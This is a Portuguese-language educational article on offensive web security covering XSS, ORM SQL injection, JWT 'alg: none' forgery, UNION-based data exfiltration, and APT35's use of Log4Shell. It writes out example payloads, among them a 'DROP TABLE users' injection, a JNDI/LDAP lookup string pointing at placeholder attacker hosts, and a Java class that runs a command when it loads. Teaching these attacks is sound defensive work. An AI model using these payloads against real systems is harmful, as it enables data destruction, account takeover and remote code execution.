![WWW](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/89c92vzuxd4jon4dfn0z.png)

## Resumo
Este texto tem como proposta uma análise  aprofundada sobre a segurança de aplicações web, mas de uma perspectiva ofensiva. Através da **arquitetura de três camadas** (Apresentação, Aplicação e Dados), comumente conhecido como **Three Tier Architecture**, detalhando vetores de ataques específicos para cada camada com exemplos de código práticos. Além disso, também fornecer uma investigação de táticas, técnicas e procedimentos (TTPs) de grupos de Ameaça Persistente Avançada (APT), como o **APT35**, esmiuçando tecnicamente um de seus ataques com exemplos de payloads e comandos. O texto também explora a importância da análise a partir do OWASP Top 10 que lista os dez riscos de segurança mais críticos e comuns em aplicações web. O objetivo é permitir uma visão técnica e estruturada, para aspirantes, entusiastas, profissionais e pesquisadores da área de segurança da informação interessados em vulnerabilidades em aplicações web e em um ciclo de ataque de um APT.

## 1. Introdução
A grande crescente de dependência de aplicações web para serviços críticos, tendo em vista que hoje tudo pode ser feito através do navegador tornou a segurança dessas aplicações um pilar fundamental da cibersegurança. Atacantes, desde indivíduos até mesmo grupos de Ameaça Persistente Avançada (APT), **patrocinados muitas vezes por estados**, exploram vulnerabilidades em aplicações web para roubo de dados, espionagem, sabotagem, etc. **Compreender a estrutura das aplicações web e como os(as) atacantes a manipulam é indispensável para a construção de defesas sólidas**.

Este texto tenta aplicar uma visão ofensiva para dissecar a segurança de aplicações web. Deste modo, inicia-se com a análise da arquitetura de três camadas, um modelo predominante no mercado, e como cada camada pode apresentar uma superfície de ataque única, com exemplos de código que ilustram os ataques. A referência dessa análise é o OWASP Top 10 e a partir dele, construir uma ponte entre as vulnerabilidades em uma visão teórica e os ataques do mundo real, examinando estudos de caso de grupos APT.

## 2. Arquitetura de Três Camadas e Vetores de Ataque

![Três camadas](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k3t3tq18ukef0ohirrq3.png)

A arquitetura de três camadas é predominante para aplicações tradicionais de cliente-servidor e é dividida em três unidades lógicas: a camada de apresentação, camada de aplicação e camada de dados. Essa separação cria diferentes domínios de segurança.

### 2.1. Camada de Apresentação (Presentation Layer)
É a interface com o usuário no navegador, além de ser a camada de comunicação da aplicação no qual o usuário final interage. A princípio, seu objetivo é de exibir e coletar informações do usuário. Do ponto de vista de um invasor, esta camada é um alvo principal para ataques que  focam o usuário.

### 2.1.1. Cross-Site Scripting

Cross-Site Scripting (XSS) é uma falha no sistema que possibilita o/a atacante injetar códigos maliciosos em páginas web. O OWASP classifica o XSS como uma forma de Injeção (A05:2025) e dialoga também com Configuração incorreta de segurança (A02:2025).

Hodiernamente, WAFs (Firewalls de Aplicações Web) e frameworks modernos (React, Angular, Django, etc.) já possuem mecanismos que bloqueiam XSS tradicionais (como o clássico `<script>alert(1)</script>`). Logo, os ataques também mudaram de lugar, muitos agora exploram contextos específicos, validação incompleta de entrada e renderização dinâmica no cliente (DOM XSS).

Imagine uma rede social onde os usuários podem editar a sua biografia, algo bastante comum em diversos ambientes online, como o X/Twitter, Facebook e Instagram. Neste ponto, é possível inserir um texto formatado, seja em negrito, com links, emojis, etc.

A partir dessa contextualização, em um cenário de rede social que usa um editor de texto, por exemplo, e salva o conteúdo HTML diretamente no banco de dados, quando esse perfil é renderizado, o HTML vem direto da base e é inserido na página, com algo assim:

```bash
<div class="bio">
  <p>Olá, me chamo Pedroca e quero fazer novas amizades😎</p>
</div>
```

Só que nesse processo de inspecionar o HTML e observar como o sistema lida com esse conteúdo após recebe-lo, principalmente sobre como o valor do campo é armazenado e renderizado depois no site,  o/a atacante percebe que o campo aceita algumas tags HTML. Ele/Ela tenta inserir um conteúdo aparentemente inofensivo, mas com comportamento malicioso.

O/A invasor(a) insere na biografia:

```bash
<p>Olá, me chamo Pedroca e quero fazer novas amizades😎</p>
<img src="https://pedrocanews.com/imagem.png" onmouseover="alert('XSS by Pedroca')" />
```

E nesse contexto, nem sempre as WAFs conseguem ser acionadas, porque não usa a tag `<script>` diretamente, além de parecer legítimo, porque <img> é uma tag comum e a execução acaba dependendo de um evento do DOM (Modelo de Objeto de Documento) e quando outro usuário passa o mouse sobre a imagem, o Javascript é executado, com isso ocorre uma execução arbitrária dentro do domínio do site.

### 2.2. Camada de Aplicação

A camada de aplicação é basicamente a parte central, pois processa a lógica de negócios. É talvez o alvo mais almejado e rico para intrusos(as) que buscam comprometer a funcionalidade principal, além de também incluir, excluir ou modificar informações da camada de dados.

### 2.2.1. Injeção de SQL (SQLi)

A injeção de SQL ocorre quando um adversário insere uma consulta SQL maliciosa. É uma das vulnerabilidades mais perigosas, categorizada como Quebra de controle de acesso (A01:2025),  Configuração incorreta de segurança (A02:2025) e Injeção (A05:2025) pelo OWASP, no entanto, muitas aplicações não montam mais queries SQL “na mão”. Hoje, usam **ORMS** (Object-Relational Mappers) que criam uma ponte entre o banco de dados e uma aplicação orientada a objetos. Por consequência, o SQLi não é mais só concatenar string, porque por padrão, usam consultas parametrizadas (prepared statements), que separam os dados da lógica da consulta, tornando a injeção mais “tradicional” quase impossível.

Em um cenário prático, onde supostamente uma API de busca está vulnerável, a mesma aceita parâmetros de entrada do usuário e os passa diretamente para um ORM sem qualquer validação adequada permitindo que os invasores manipulem consultas ao banco de dados. Portanto, ocorre uma injeção via ORM.

O Back end expõe o endpoint:

```bash
GET /api/users?sort_by=name&order=asc
```

O desenvolvedor escreve o código, que está em Node.js com Sequelize:

```bash
const sortBy = req.query.sort_by; 
const order = req.query.order;   

User.findAll({
  order: [[sortBy, order]]
});

```

Em uma primeira análise, aparenta ser seguro, tendo em vista que o ORM “escapa” parâmetros. mas o problema é que não escapa identificadores (colunas), e como o `sortBy` vai direto para query, o intruso controla parte da estrutura SQL e então o atacante envia:

```bash
GET /api/users?sort_by=name);DROP TABLE users;--

```

A query interna se transforma em algo parecido com:

```bash
SELECT * FROM users ORDER BY name);DROP TABLE users;--

```

Ou seja, se o ORM não sanitiza adequadamente os nomes de coluna, essa instrução extra pode ser interpretada, e mesmo com WAFs, esse tipo de ataque pode acabar passando, pois o payload não contém palavras-chave simples como `‘ OR 1=1;` , além de ser possível também ofuscar essas requisições.

### 2.2.2. Quebra de Autenticação
Quebra de autenticação são falhas que permitem a atacantes comprometerem contas de usuários e interage com Quebra de controle de acesso (A01:2025), Configuração incorreta de segurança (A02:2025) e Falhas de autenticação (A07:2025) do OWASP Top 10.

Outro ponto importante é que se utiliza muito os tokens para autenticação via API, no lugar de cookies e sessões, como por exemplo o **JWT** (JSON Web Token) e apesar do uso de tokens, algumas novas formas de falhas surgiram em virtude do mau uso deles.

Imagine uma aplicação que gera tokens JWT mal configurados:

```bash
const jwt = require('jsonwebtoken');
const token = jwt.sign({ user: username, role: 'user' }, 'chave-secreta');
```

e valida dessa forma:

```bash
jwt.verify(token, 'chave-secreta');
```

Neste ponto, o Back end acaba aceitando tokens sem checar o algoritmo usado e em uma exploração, onde um invasor cria um token com o algoritmo “none”, acaba forçando o servidor a não verificar assinatura:

```bash
{
  "alg": "none",
  "typ": "JWT"
}

```

Payload:

```bash
{
  "user": "pedroca",
  "role": "admin"
}

```

Como resultado, o back end confia no token mascarado, concedendo acesso administrativo. Apesar da falha “alg: none” ser antiga, alguns sistemas ainda são vulneráveis, principalmente por usar serviços intermediários (API Gateways, proxies) que só verificam formato e não a assinatura.

### 2.3. Camada de Dados (Data Layer)
A camada de dados é a camada na qual as informações processadas pela aplicação são armazenadas e gerenciadas.  A aplicação basicamente persiste, busca e processa as informações cŕiticas. Quando por exemplo, a camada de aplicação é vulnerável a Injeção SQL, um atacante pode acabar usando dessa falha para exfiltrar dados diretamente do banco.

### 2.3.1 Exfiltração de Dados via SQLi
Exfiltração de dados via SQLi  é quando um atacante pode usar da vulnerabilidade de injeção SQL para retirar dados diretamente do banco de dados. Pode ser categorizada nas mesmas dinâmicas da Injeção de SQL quanto ao OWASP, já que nasce a partir dela.

Em uma aplicação de e-commerce com um determinado endpoint de busca:

```bash
GET /api/products?category=iphone
```

O back end executa uma query dessa forma:

```sql
SELECT name, price FROM products WHERE category = 'iphone';

```

A pessoa que está desenvolvendo confia plenamente no parâmetro `category` e apenas insere ele na query, mas um atacante consegue perceber isso e começa a explorar, ainda que tenha que passar pelos WAFs e logs que filtram strings simples como `‘ OR 1=1`  ou `UNION SELECT` .

O atacante insere a clássica aspas simples:

```sql
/api/products?category=iphone'

```

O back end acaba retornando erro de SQL e cria brechas para a exploração. Uma das diversas técnicas é a injeção UNION-Based.

```sql
' UNION SELECT username, email FROM users--

```

Essa query faz com que o sistema combine os resultados da tabela users com os da tabela products. O servidor caso seja possível burlar as camadas de segurança retorna algo como:

```sql
[
  {"name": "pedroca", "price": "pedroca@example.com"},
  {"name": "admin", "price": "admin@example.com"}
]

```

Esse tipo de ataque funciona porque o banco de dados acaba sendo compartilhado entre diferentes áreas da aplicação, e a query é montada de forma concatenada, sem uso de parâmetros. Hoje WAFs detectam `UNION SELECT` literal, então os invasores tentam disfarçar a consulta de alguma forma, seja com encoding, comentários in-line, etc.

## 3. Ameaças Persistente Avançadas (APTs)
Uma **Ameaça Persistente Avançada (APT)** é um tipo de ataque cibernético mais sofisticado e longo, no qual um agente de ameaça, geralmente um **estado-nação** ou um grupo que seja patrocinado por ele, realiza ataques que obtém acesso não autorizado, sendo as aplicações web vetores de entrada bastante comuns e permanecem indetectado por um longo período. O objetivo principal dessas ações, é justamente roubo de dados sensíveis, espionagem, sabotagem de sistemas, etc.

O termo “APT” é definido através de três características fundamentais:

1. **Avançada (Advanced)**: Os invasores utilizam de um leque completo de ferramentas e técnicas, que podem incluir desde exploração de vulnerabilidades **zero day**, **engenharia social** muito bem direcionada ****e **malwares** bem objetivos.
2. **Persistente (Persistent)**: Neste ponto o invasor consegue manter um **canal de comando e controle** (Command and Control - C2) contínuo com um dos ou o sistema comprometido, garantindo o acesso, mesmo depois de uma possível detecção e remoção, por exemplo de um malware. É possível também muitas vezes, a depender do escopo dos objetivos traçados, que acabe retornando novamente ao sistema.
3. **Ameaça (Threat)**: Esse ataque é orquestrado por grupos de agente de ameaça, organizado e motivado, com recursos significativos e objetivos muito bem definidos, como governos, grandes corporações ou infraestruturas críticas.

### 3.1. Grupos de APT e suas táticas
Os Grupos de APT são categorizados por agências de inteligência e empresas de segurança cibernética, muitas vezes recebem nomes a partir de taxonomia e identificadores alfanuméricos, como no caso do framework **MITRE ATT&CK**, que é uma referência essencial para compreender as táticas e técnicas usadas por esses grupos.

### 3.1.1 Táticas, Técnicas e Procedimentos (TTPs) de APTs
As **Táticas, Técnicas e Procedimentos (TTPs)** representam ****a forma de agir de um APT, detalhando desde o “por quê”, “como” e o “o quê” de suas ações O ciclo de vida de um ataque APT é normalmente dividido em fases, e o framework **MITRE ATT&CK** fornece a taxonomia mais aceita atualmente para descrever as TTPs em cada fase.

### 3.1.2. O Ciclo de Vida do Ataque e o MITRE ATT&CK
O ciclo de vida de um ataque APT é um processo multifacetado e contínuo, que se relaciona diretamente com as **Táticas** do MITRE ATT&CK. As táticas representam o objetivo tático do adversário/a em cada estágio do ataque.


![Matriz](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/77smrisay8zm1fhfztah.png)



1. **Reconhecimento - Reconnaissance (TA0043)**: O invasor reúne informações que podem ser usadas para planejar operações futuras, coletando ativa ou passivamente informações que podem ser usadas para apoiar a definição de alvos.
2. **Desenvolvimento de Recursos - Resource Development (TA0042)**: O invasor tenta estabelecer recursos que podem ser usados para apoiar as operações, seja criando, comprando ou comprometendo/roubando recursos que podem ser usados para apoiar o direcionamento. Esses recursos incluem infraestrutura , contas ou recursos.
3. **Acesso Inicial - Initial Access (TA0001)**: Consiste em técnicas que utilizam vários vetores de entrada para obter um acesso inicial dentro de uma rede. 
4. **Evasão de Defesa - Defense Evasion (TA0005)**: Os atacantes usam técnicas para evitar a detecção durante todo o processo de comprometimento.
5. **Descoberta - Discovery (TA0007)** - O atacante tenta obter o máximo de conhecimento possível sobre o sistema e a rede interna.
6. **Execução - Execution (TA0002)**: Consiste em técnicas que resultam na execução de código controlado pelo adversário em um sistema local ou remoto.
7. **Escalação de Privilégios - Privilege Escalation (TA0004)**: As técnicas consistem em tentar obter permissões maiores em um sistema ou rede, como um root por exemplo.
8. **Persistência - Persistence (TA0003)**: Os adversários utilizam técnicas para manter o acesso aos sistemas após reinicializações, alterações de credenciais e outras formas de interrupções que poderiam cortar o seu acesso.
9. **Movimento Lateral - Lateral Movement (TA0008)**: O adversário tenta ampliar seu campo de ataque e atingir mais sistemas em uma rede.
10. **Comando e controle - Command and Control C2 (TA0011)**:  O atacante tenta se comunicar com sistemas comprometidos para controlá-los.
11. **Exfiltração - Exfiltration (TA0010)**: Os adversários se utilizam de técnicas para roubar dados da rede invadida.
12. **Impacto - Impact (TA0040)**: O adversário tenta manipular, interromper ou destruir os sistemas e dados de um alvo. O impacto consiste em utilizar técnicas que possam interromper a disponibilidade ou comprometer a integridade, manipulando processos comerciais e operacionais.

### 3.1.3. Técnicas e Procedimentos
As **Técnicas** no MITRE ATT&CK descrevem “como” o adversário atinge um objetivo tático ( o “ por que”). 

Os **Procedimentos** são a forma como um grupo APT aplica uma técnica**.** Por exemplo, o grupo **APT35**  implementa a técnica **Explorar aplicativos voltados para o público - Exploit Public-Facing Application (T1190)** utilizando de forma específica a exploração da vulnerabilidade CVE 2021-44228 **(Log4Shell)** em  aplicações web que usam Java.

A sofisticação de um APT reside em sua capacidade de encadear diversas técnicas (Ts) e procedimentos (Ps) de forma bem coordenada e adaptativa, assim garante que o ataque persista e atinja o objetivo final, que é a **Exfiltração** ou **Impacto** (como sabotagem).

### 3.2. Aplicações Web como Vetor de Entrada Comum
Conforme foi dito no decorrer do texto, as **aplicações web** representam um vetor de entrada bastante comum e crítico para os grupos de APT. Na matriz do *MITRE* essa tática é classificada como **T1190: Explorar aplicativos voltados para o público (Exploit Public-Facing Application)**, dito mais acima.

> “Os adversários podem tentar explorar uma vulnerabilidade em um host ou sistema voltado para a Internet para acessar inicialmente uma rede. A vulnerabilidade no sistema pode ser um bug de software, uma falha temporária ou uma configuração incorreta.
> 
> 
> Os aplicativos explorados geralmente são sites/servidores da web, mas podem também incluir banco de dados (como SQL), serviços padrões (SMB ou SSH), protocolos de administração e gerenciamento de dispositivos de rede (SNMP e Smart Install) e qualquer outro sistema com soquetes abertos acessíveis pela Internet.
> 
> *MITRE ATT&CK*- Technique T1190                                                       
> 


A exploração de aplicações web e servidores para o público é um método preferencial para obter o Acesso Inicial, pois permite que os atacantes possam contornar as defesas tradicionais. As vulnerabilidades mais exploradas por APTs em aplicações web incluem algumas das já destacadas anteriormente pelo OWASP Top 10, justamente por mapear as fragilidades mais comuns na atualidade.

## 4. Exploração de Aplicações web via Log4Shell (CVE 2021-44228)
O APT35 também conhecido como **Charming Kitten**, **Magic Hound** e **Phosphorus**, é um grupo de ameaças cibernéticas patrocinado pelo Irã que conduz operações de espionagem cibernética de longo prazo. Eles tem como alvo funcionários governamentais e militares europeus, norte-americanos e do Oriente Médio, acadêmicos, jornalistas e organizações como a Organização Mundial da Saúde (OMS).

As operações do APT35 são comumente caracterizadas por campanhas de engenharia social sofisticadas e suas atividades são rastreadas desde 2014.

| Atributo do APT | Detalhe |
| --- | --- |
| **ID** | G0059 |
| **Nome** | Magic Hound (APT35, Charming Kitten, Phosphorus) |
| **Origem Atribuída** | Irã |
| **Alvos comuns** | Governo, militares, acadêmicos, jornalistas e organizações de saúde no Oriente Médio, Europa e EUA. |
| **Tática Primária** | Campanhas de engenharia social complexas. |
| **Ferramentas Notáveis** | **PowerShell**, *webshells*, e ferramentas de compressão como **RAR** e **gzip**. Além do uso de malwares como o *backdoor* **PowerLess**. |

### 4.1. Log4Shell
O  **Log4Shell** (CVE 2021-44228) é uma vulnerabilidade **zero day** que foi reportada em novembro de 2021, que possibilita a **execução de código remoto (RCE)** em algumas versões da biblioteca de logging Apache Log4j **2.x de 2.0-beta9 até 2.14.1** e afeta diretamente a **Camada de Aplicação** de diversas apps da web que são baseados em Java.

Este estudo de caso detalha tecnicamente essa exploração do Log4Shell, focando principalmente em como um input em uma aplicação web pode se transformar em um RCE, e mapeando os ataques com base no OWASP Top 10.

Um ponto importante é que o Log4Shell é um ataque que se manifesta na **Camada de Aplicação** na arquitetura de três camadas, mas é iniciado através da **Camada de Apresentação**.

### 4.1.1 O papel da Arquitetura de Aplicações Web e o OWASP
O Log4Shell é um ataque de **injeção de dados** que se propaga através das camadas:

| **Camada da Arquitetura** | **Componente comum** | **CVE Relacionada** | Relação com o Ataque |
| --- | --- | --- | --- |
| **Apresentação**  | Formulários Web, Cabeçalhos HTTP | **CVE-2021-44228** | O atacante injeta o payload JNDI/LDAP em campos de entrada ou cabeçalhos HTTP ( `User-Agent`), que são processados pela Camada de Aplicação. |
| **Lógica de Negócio (Aplicação)** | Servidor de Aplicação Java (Tomcat, JBoss) | **CVE-2021-44228** | A vulnerabilidade reside na biblioteca Log4j 2.x, que é parte da Camada de Lógica. O payload é interpretado, resultando em RCE. |
| **Dados** | Banco de Dados (PostgreSQL, MySQL) | (Acesso Indireto) | O RCE obtido na Camada de Aplicação permite o acesso e a manipulação de dados sensíveis, **ameaçando a integridade e disponibilidade da camada de dados**. |

Ademais, também se enquadra primariamente na categoria **A05:2025 - Injection** do OWASP Top 10:2025,  pois o ataque é uma forma de injeção onde o atacante injeta uma *string* maliciosa (`${jndi:ldap://...}`) que é interpretada pelo *logger* como um comando, assim acaba sabotando o fluxo de execução do programa.

### 4.2. Detalhes do ataque
![Log4SHell](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zdoilksucqg4nei9h5ba.png)
*Source: Check Point Research*

O Log4Shell explora a funcionalidade de lookups da Log4j, especificamente a capacidade de realizar consultas via **JNDI (Java Naming and Directory Interface)**.

```java
logger.info("Requisição de: " + userAgent);
```

O logger é responsável por registrar mensagens de log, enquanto o método info grava uma mensagem de nível **informativo**.

```java
User-Agent: ${jndi:ldap://pedroca.com/payload}
```

A sintaxe de lookup do Log4j permite **substituições dinâmicas**, como no exemplo `${env:USERNAME}`, que é substituído pelo valor da variável de ambiente `USERNAME` do sistema operacional.

Entretanto, nas versões do **Log4j 2.0 até 2.14.1**, também eram permitidos *lookups* via **JNDI (Java Naming and Directory Interface)**, uma API do Java usada para consultar **serviços de diretório em servidores externos**, como LDAP (Lightweight Directory Access Protocol) ou RMI (Remote Method Invocation).

Esse recurso legítimo acabou sendo explorado por atacantes para **carregar e executar código malicioso** **remotamente**.

A exploração do Log4 Shell é um processo de quatro etapas que transforma um simples string de entrada em RCE.

### 4.2.1. 1**º Etapa: Injeção do Payload (Camada de Apresentação)**
O atacante injeta o payload JNDI em qualquer campo de entrada que possa ser logado pela aplicação. E o vetor mais comum é o cabeçalho `User-Agent` de uma requisição HTTP.

**Payload JNDI/LDAP:**

```java
${jndi:ldap://[IP.DO.INVASOR]:PORTA/[CLASSE.MALICIOSA]}
```

### 4.2.2. 2**º Etapa: Interpretação e Consulta JNDI (Camada de Aplicação)**
A aplicação web recebe a requisição HTTP, o servidor de aplicação processa essa requisição e, em determinado momento, o Log4j registra a entrada (`User-Agent`), consequentemente encontra a string `${PEDROCA}` e a interpreta como um lookup e e por fim o lookup JNDI é resolvido, forçando o servidor Java a iniciar a conexão com o servidor LDAP controlado pelo(a) atacante (`[IP.DO.INVASOR]:Porta` ).

### 4.2.3. 3**º Etapa: Resposta do Servidor LDAP e Deserialização**
O servidor LDAP do/a atacante responde com uma referência a classe Java maliciosa (`[CLASSE.MALICIOSA]` ) e URL para download do arquivo `.class`( via HTTP),  assim o cliente JNDI no servidor vulnerável (lá da Camada de aplicação) segue a referência e baixa o arquivo `.class`  suspeito, fazendo o próprio servidor Java deserializar e executar o código da classe suspeita, resultando em uma execução remota de código (RCE).

### 4.2.4. 4**º Etapa: Um exemplo de Classe Maliciosa (Payload de RCE)**
A classe suspeita é estruturada para executar um comando do sistema operacional no momento da sua inicialização.
```java
import java.io.IOException;

public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("payload de rce");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

O bloco static {} em java é executado automaticamente quando a classe é carregada e assim torna o ataque viável, pois o Log4j faz o lookup e carrega a classe. 

## 5. Mapeamento MITRE ATT&CK
| Tática | ID da Tática | Técnica | ID da Técnica | Descrição do Uso no Log4Shell |
| --- | --- | --- | --- | --- |
| **Initial Access** | TA0001 | Exploit Public-Facing Application | **T1190** | Injeção do payload JNDI/LDAP através de uma entrada de aplicação web. |
| **Execution** | TA0002 | Command and Scripting Interpreter | **T1059** | Execução de comandos via *shell* reverso ou comandos do sistema operacional injetados na classe suspeita. |
| **Defense Evasion** | TA0005 | Obfuscated Files or Information | **T1027** | Uso de lookups aninhados ou ofuscação no payload JNDI para evitar detecção. |

## 5. Conclusão
A segurança de aplicações web exige uma abordagem em maior profundidade que considere os vetores de ataque em cada camada de sua arquitetura. A análise  das táticas de grupos de APT como o APT35 mostra a exploração de forma mais ampla sobre as vulnerabilidades, sendo o ataque Log4Shell um exemplo de como uma falha na Camada de Aplicação (OWASP A05: Injection) pode levar a um RCE de impacto muito alto. Sua exploração a partir da entrada de um simples string em uma aplicação web, mostra a necessidade e importância de validação de entrada e de uma postura de segurança mais sólida em todas as camadas de arquitetura.

## 7. Referências
Check Point. *APT35 exploits Log4j vulnerability to distribute new modular PowerShell toolkit*. Disponível em: [[https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/](https://research.checkpoint.com/2022/apt35-exploits-log4j-vulnerability-to-distribute-new-modular-powershell-toolkit/)]

CISA. *Apache Log4j Vulnerability Guidance*. Disponível em: [[https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)]

MITRE ATT&CK. *Group: Charming Kitten (G0067)*. Disponível em: [[https://attack.mitre.org/groups/G0059/](https://attack.mitre.org/groups/G0059/)]

MITRE ATT&CK. *Enterprise ATT&CK Matrix*. Disponível em: [[https://attack.mitre.org/matrices/enterprise/](https://attack.mitre.org/matrices/enterprise/)]

NVD. *CVE-2021-44228 Detail*. Disponível em: [[https://nvd.nist.gov/vuln/detail/cve-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)]

OWASP. (2025). *OWASP Top 10:2025*. Disponível em: [[https://owasp.org/Top10/](https://owasp.org/Top10/)]

Unit 42. *Apache log4j Vulnerability CVE-2021-44228*.
 Disponível em: [[https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)]